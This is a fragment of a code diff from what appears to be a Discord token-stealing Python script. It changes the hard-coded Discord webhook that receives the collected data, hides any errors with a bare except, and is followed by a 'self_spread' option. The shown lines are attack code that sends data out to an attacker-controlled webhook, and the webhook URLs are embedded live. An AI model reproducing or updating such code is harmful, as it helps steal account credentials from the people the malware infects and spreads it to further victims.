@@ -199,7 +199,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/webhooks/852291945694888017/3ZLrgFPAbvmoRM7fDD91C9RjUpuqPpW3QvQYCusvwABdVpqsJe9JsDrJkwremMiBW08R", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/855104222868275220/_kF8-GQ8PFQdWPLxYBYN_o9SgvfcHnmzxvlplXCGg7-aiEcGa7p24H43O1yP2XyS3M6p", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
